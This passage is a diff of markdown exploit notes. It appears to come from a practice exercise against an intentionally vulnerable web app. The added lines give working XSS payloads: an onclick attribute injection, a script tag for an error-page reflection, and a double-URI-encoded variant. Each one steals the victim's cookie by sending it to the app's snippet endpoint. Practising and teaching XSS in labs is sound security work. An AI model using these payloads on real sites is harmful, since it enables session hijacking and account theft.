@@ -39,11 +39,26 @@ Need to break out of `style='{color}'` context.
 
 ### Homepage
 
-Not restricted to actual URL, can set to `%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E` for stored XSS
+Not restricted to actual URL, can set to `%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E` for stored XSS.
+
+Sanitization is weak (just `<>&"`), so to simply attach some onclick javascript:
 
 ```text
 ' onclick='eval("exfil=document.createElement(\"img\");exfil.src=\"newsnippet2?snippet=\"+document.cookie;document.body.appendChild(exfil);")'
 ```
+
+To use the "error page" reflection vulnerability:
+
+```text
+<script>exfil=document.createElement("img");exfil.src="newsnippet2?snippet="+document.cookie;document.body.appendChild(exfil);</script>
+```
+
+double-uri-encode (including dots) to:
+
+```
+%253Cscript%253Eexfil%253Ddocument%252EcreateElement%2528%2522img%2522%2529%253Bexfil%252Esrc%253D%2522newsnippet2%253Fsnippet%253D%2522%252Bdocument%252Ecookie%253Bdocument%252Ebody%252EappendChild%2528exfil%2529%253B%253C%252Fscript%253E
+```
+
 
 ### Admin
 
